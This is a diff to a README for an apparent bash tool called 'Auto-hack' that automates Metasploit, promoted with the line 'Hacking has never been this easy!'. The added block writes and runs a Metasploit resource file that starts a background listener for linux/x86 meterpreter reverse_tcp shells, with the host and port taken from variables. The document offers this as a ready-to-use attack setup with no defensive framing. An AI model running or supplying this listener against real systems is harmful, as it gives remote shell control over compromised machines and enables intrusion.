@@ -1,6 +1,17 @@
 ## 🟢 Auto-hack
 Automation with bash scripts!
 **Hacking has never been this easy!**
+```bash
+echo "
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST $ip
+set LPORT $port
+set ExitOnSession false
+exploit -j -z
+" > msfpayloads/linux.rc
+msfconsole -r msfpayloads/linux.rc
+```
 
 ## 🩸 MsfVenom Auto starts Metasploit!
 <img src="Screenshot_2021-04-09_04_04_07.png" width=700>
